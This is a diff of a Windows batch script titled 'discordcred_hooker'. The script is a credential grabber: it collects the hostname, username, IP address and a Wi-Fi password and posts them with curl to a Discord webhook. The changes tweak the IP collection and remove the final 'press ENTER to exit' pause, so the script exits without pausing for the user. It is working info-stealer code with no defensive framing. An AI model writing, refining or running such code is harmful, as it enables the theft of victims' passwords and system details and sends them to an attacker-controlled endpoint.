@@ -6,7 +6,7 @@ title discordcred_hooker
 echo ------------------------------------------- > line1.txt
 hostname > host.txt
 echo %username% > user.txt
-ipconfig /all | find "IPv4" > ip.txt
+ipconfig | find "IPv4" > ip.txt
 
 echo ------------------------------------------- > line2.txt
 
@@ -51,6 +51,3 @@ timeout /t 0 > nul
 curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%wifipass%\"}" %webhook%
 timeout /t 0 > nul
 curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%
-
-echo press ENTER to exit
-pause > nul
